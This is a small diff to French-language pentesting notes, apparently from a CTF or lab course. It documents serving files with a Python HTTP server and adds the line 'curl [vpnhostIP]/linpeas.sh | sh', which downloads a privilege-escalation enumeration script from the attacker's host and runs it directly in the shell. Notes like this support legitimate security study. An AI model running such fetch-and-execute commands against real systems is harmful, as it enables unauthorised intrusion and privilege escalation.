@@ -1,7 +1,8 @@
 N'oublie pas la commande man  
-python -m http.server 8000
 
-Pour récupérer le fichier : `curl [vpnhostIP]/`[linpeas.sh](http://linpeas.sh "http://linpeas.sh") `| sh` pour l'executer directement
+python -m http.server 8000 : Lancer un serveur python local
+
+Pour récupérer le fichier : `curl [vpnhostIP]/linpeas.sh| sh` pour l'executer directement
 
 wget : récupérer des fichiers via internet.
 
